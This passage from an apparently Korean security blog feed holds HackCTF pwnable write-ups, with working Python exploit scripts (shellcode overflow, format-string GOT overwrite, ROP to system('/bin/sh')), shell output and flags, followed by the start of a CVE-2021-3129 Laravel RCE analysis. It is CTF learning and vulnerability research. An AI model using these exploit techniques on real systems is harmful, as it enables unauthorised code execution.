class="string">&quot;\x31\xC9\x8D\x41\x0B\x99\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Data : &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recvline()[<span class="number">0</span>:<span class="number">10</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;buf addr : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(buf_addr)))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Again (y/n): &quot;</span>, <span class="string">&quot;Y&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = shell_code</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span> * (<span class="number">140</span> - <span class="built_in">len</span>(shell_code)) <span class="comment"># buffer + sfp + shellcode_length</span></span><br><span class="line">payload += p32(buf_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Data : &quot;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ python simple_overflow_ver2.py </span><br><span class="line">[+] Opening connection to ctf.j0n9hyun.xyz on port 3006: Done</span><br><span class="line">[*] buf addr : 0xffe73ef0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">0xffe73ef0:  1 � \x8d A \x0b\x99 h &#x2F; s h</span><br><span class="line">Again (y&#x2F;n): $ cat flag</span><br><span class="line">$ cat  flag</span><br><span class="line">HackCTF&#123;y0u_d1d_7h3_45516nm3n7_5ucc355fully!&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{y0u_d1d_7h3_45516nm3n7_5ucc355fully!}</p></blockquote><hr><h2 id="PWN-D-6-2021-02-01"><a href="#PWN-D-6-2021-02-01" class="headerlink" title="PWN D+6 (2021.02.01)"></a>PWN D+6 (2021.02.01)<br></h2><hr><p>HackCTF Challenge : You are silver</p><p>이번 문제는 64 bit FSB 취약점을 이용한 문제를 가져왔습니다. 64 bit는 32 bit와 다르게 레지스터를 출력 후에 스택 정보를 출력해줍니다.<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v6 = <span class="number">50</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your name&quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">46</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s, <span class="number">46LL</span>);</span><br><span class="line">  v5 = get_tier(v6);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>코드를 보면 fgets 함수를 이용해서 46 바이트만큼 s에 입력해주고, printf 함수를 이용해서 출력해주고 있습니다. 하지만 여기서 포맷스트링이 정의되어 있지 않아 FSB 취약점이 발생합니다. 그 후에 get_tier 함수의 반환 값을 v5에 넣고, v5를 출력하는 것을 볼 수 있습니다.<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">get_tier</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">50</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 &gt; <span class="number">65</span> || a1 &lt;= <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a1 &gt; <span class="number">75</span> || a1 &lt;= <span class="number">65</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a1 &gt; <span class="number">75</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;\nYou are challenger.&quot;</span>);</span><br><span class="line">          result = <span class="number">4LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\nYou are master.&quot;</span>);</span><br><span class="line">        result = <span class="number">3LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nYou are platinum.&quot;</span>);</span><br><span class="line">      result = <span class="number">2LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nYou are silver.&quot;</span>);</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_tier 함수를 보면 인자 값 a1을 이용해서 티어를 정하는 것을 볼 수 있고, 각 티어별로 반환하는  1, 2, 3, 4 입니다.<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">play_game</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a1 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;master can&#x27;t play game. Sorry! :(&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( a1 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Challenger. Take this first!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat ./flag&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;SILVER can&#x27;t play game.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Who are you? get out!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;platinum can&#x27;t play game. :(&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>그리고 함수를 보니 play_game라는 함수가 있는데, 해당 함수의 인자 값인 a1이 4면 FLAG를 읽는 것을 볼 수 있습니다. 즉, FSP 취약점을 이용해서 printf 함수의 got를 play_game에 주소로 바꿔주면 되고, v6의 값도 75보다 크게 바꿔 줘야 하는데, 이는 변수 위를 보면 s 변수가 위치한 범위 끝에 v5가 위치하기 때문제 2바이트만큼은 덮을 수 있습니다.<br></p><ul><li>시나리오<br></li></ul><ol><li>FSB 취약점을 이용해서 printf got의 주소를 play_game 함수로 바꿔줌.</li><li>fgets 함수에서 마지막 2바이트까지 꽉 채워서 보내주면 알아서 v5 값이 바뀜.<br></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3022</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./you_are_silver&quot;</span>)</span><br><span class="line"></span><br><span class="line">play_game = e.sym[<span class="string">&#x27;play_game&#x27;</span>]</span><br><span class="line">printf_got = <span class="number">0x601028</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;play_game addr : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(play_game)))</span><br><span class="line">log.info(<span class="string">&quot;printf_got : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(printf_got)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%4196055c&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%8$ln11&quot;</span></span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">payload += <span class="string">&quot;s&quot;</span> * (<span class="number">46</span> - <span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>여기서 <code>%8$ln11</code> 부분에서 8을 준 이유는 printf got에 값이 8번 째에서 나오기 때문입니다. 레지스터가 모두 출력 되고, 스택이 출력되는데 6번 째는 <code>%4196055</code>, 7번 째는 <code>c%8$ln11</code>, 그리고 8번째에 <code>printf_got</code>가 출력이 됩니다. 또한 <code>%8$ln11</code>에서 마지막 <code>11</code>은 8 바이트를 모두 채우기 위한 패딩입니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">                                              &#x3D;11(\x10</span><br><span class="line">You are challenger.</span><br><span class="line">Challenger. Take this first!</span><br><span class="line">HackCTF&#123;N0w_Y0u_4re_b4side_0f_F4K3R&#125;</span><br><span class="line">Who are you? get out!</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{N0w_Y0u_4re_b4side_0f_F4K3R}</p></blockquote><hr><p>HackCTF Challenge : ROP</p><p>이번 문제는 그냥 32 bit에서 간단한 ROP이므로 익스 코드만 작성하겠습니다.<br></p><ul><li>시나리오<br></li></ul><ol><li>write 함수를 이용해서 read 주소를 릭한다. 여기서 릭한 주소는 나중에 libc base 주소를 구할 때 사용</li><li>read 함수를 이용해서 bss에 <code>/bin/sh\x00</code>을 입력 받는다.</li><li>read 함수를 이용해서 read got를 system 함수의 주소로 덮는다.</li><li>read 함수를 호출하면 system 함수가 호출 될 것 이고, 이때 인자로는 bss를 넘겨주면 쉘이 따진다.<br></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3021</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_got = e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt = e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pppr = <span class="number">0x8048509</span></span><br><span class="line">bss = e.bss()</span><br><span class="line">read_offset = <span class="number">0xd4350</span></span><br><span class="line">system_offset = <span class="number">0x3a940</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;write@plt : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_plt)))</span><br><span class="line">log.info(<span class="string">&#x27;write@got : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_got)))</span><br><span class="line">log.info(<span class="string">&#x27;read@plt : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_plt)))</span><br><span class="line">log.info(<span class="string">&#x27;read@got : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_got)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#BOF</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">140</span> <span class="comment"># buffer + sfp</span></span><br><span class="line"></span><br><span class="line">payload += p32(write_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(read_got)</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bss)</span><br><span class="line">payload += p32(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(read_got)</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += <span class="string">&quot;aaaa&quot;</span></span><br><span class="line">payload += p32(bss)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = leak - read_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">log.info(<span class="string">&#x27;libc_base addr : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.info(<span class="string">&#x27;system addr : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF&#x2F;rOP$ python exploit.py </span><br><span class="line">[+] Opening connection to ctf.j0n9hyun.xyz on port 3021: Done</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;pocas&#x2F;pwn&#x2F;HackCTF&#x2F;rOP&#x2F;rop&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] write@plt : 0x8048340</span><br><span class="line">[*] write@got : 0x804a018</span><br><span class="line">[*] read@plt : 0x8048310</span><br><span class="line">[*] read@got : 0x804a00c</span><br><span class="line">[*] libc_base addr : 0xf7dbb000</span><br><span class="line">[*] system addr : 0xf7df5940</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">HackCTF&#123;4bcd3fg7ijPlmA4pqrtuvxza2cdef&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{4bcd3fg7ijPlmA4pqrtuvxza2cdef}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn Note</title>
      <link href="2021/01/25/2021-01-25-npwn-note/"/>
      <url>2021/01/25/2021-01-25-npwn-note/</url>
      
        <content type="html"><![CDATA[<p><strong>PWN 공부를 하면서 알게 된 것 들을 하나 하나 정리를 해보려 합니다.</strong><br></p><hr><p>undefined</p><hr>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3129 RCE in Laravel Debug mode</title>
      <link href="2021/01/25/2021-01-25-CVE-2021-3129/"/>
      <url>2021/01/25/2021-01-25-CVE-2021-3129/</url>
      
        <content type="html"><![CDATA[<p><strong>Laravel Debug mode에서 발견된 CVE-2021-3129 취약점을 분석해보겠습니다. Laravel은 자유/오픈 소스 PHP 웹 프레임워크 중 하나라고 합니다. 해당 취약점은 보안 연구원이 Laravel을 기반으로 한 웹 사이트에서 취약점 진단을 하다가 디버그 모드에서 발견했다고 합니다. 해당 사이트는 전체적으로 안전했지만 웹 프레임워크 취약점을 이용해서 RCE를 트리거 했습니다.</strong><br></p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2021-3129</td><td>laravel &lt;= 8.4.2 and Ignition &lt;= 2.5.1</td><td>9.8</td></tr></tbody></table><p><br><strong>CVE-2021-3129는 Laravel의 &lt;= V8.4.2 DEBUG MODE에서 모두 발생한다고 합니다. 2020년 11월 16일에 POC를 전달해주었고, 바로 다음 날 패치 버전을 발표했다고 합니다.</strong><br></p><hr><h2 id="CVE-2021-3129"><a href="#CVE-2021-3129" class="headerlink" title="CVE-2021-3129"></a><em>CVE-2021-3129</em></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 141.164.52.207:8888</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.141 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;141.164.52.207:8888&#x2F;_ignition&#x2F;execute-solution</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 320</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">&quot;parameters&quot;:&#123;</span><br><span class="line">&quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;&#x2F;work&#x2F;pentest&#x2F;laravel&#x2F;laravel&#x2F;resources&#x2F;views&#x2F;hello.blade.php&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>위 요청은 username이라는 변수로 템플릿을 생성해주는 로직의 요청 헤더 값이고, solution의 값은 <code>Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution</code>, viewFile의 값은 <code>/work/pentest/laravel/laravel/resources/views/hello.blade.php</code>인 것을 볼 수 있습니다. 하지만 solution, viewFile의 값은 임의의 값으로 수정이 가능합니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Requests</span>\<span class="title">ExecuteSolutionRequest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>\<span class="title">SolutionProviderRepository</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Validation</span>\<span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExecuteSolutionController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        ExecuteSolutionRequest <span class="variable">$request</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        SolutionProviderRepository <span class="variable">$solutionProviderRepository</span></span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) </span>&#123;</span><br><span class="line">        <span class="variable">$solution</span> = <span class="variable">$request</span>-&gt;getRunnableSolution();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$solution</span>-&gt;run(<span class="variable">$request</span>-&gt;get(<span class="string">&#x27;parameters&#x27;</span>, []));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>컨트롤러를 확인해봅시다. <code>ExecuteSolutionController</code> 클래스를 확인해 보면 run() 메서드를 실행하고, 인자 값으로는 parameters를 넘겨주는 것을 볼 수 있습니다. run() 메서드는 <code>MakeViewVariableOptionalSolution::run()</code>에 정의되어 있습니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Solutions</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>\<span class="title">RunnableSolution</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Blade</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MakeViewVariableOptionalSolution</span> <span 